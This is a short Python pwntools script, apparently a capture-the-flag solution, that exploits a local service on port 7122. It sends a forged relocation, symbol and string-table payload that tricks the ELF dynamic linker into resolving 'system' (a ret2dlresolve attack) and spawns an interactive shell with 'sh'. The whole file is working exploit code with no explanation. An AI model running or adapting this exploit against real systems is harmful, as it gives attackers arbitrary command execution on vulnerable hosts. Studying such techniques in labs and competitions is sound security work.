#!/usr/bin/env python2

from pwn import *

'''
dynamic_linker = 0x80482a0
buff = 0x8048300
dynstr = 0x80481fc
dynsym = 0x804818c
rel_plt = 0x8048270
'''

plt0 = 0x80482a0
dynsym = 0x804818c
dynstr = 0x80481fc
relplt = 0x8048270

buf = 0x80495c0

r = remote('127.0.0.1', 7122)

payload = flat(
	#		       rel_off
	('.%d.%d;sh\x00' % (buf+32-relplt, plt0)).ljust(32),	# 32
	# writable memory   idx of dynsym
	buf+72, 0x7 | (((buf+44-dynsym)/16)<<8), 0xdead,	# 44
	# offset of dynstr
	buf+60-dynstr, 0, 0, 0x12,				# 60
	'system\x00\x00',					# 68
)

r.send(payload)

r.interactive()

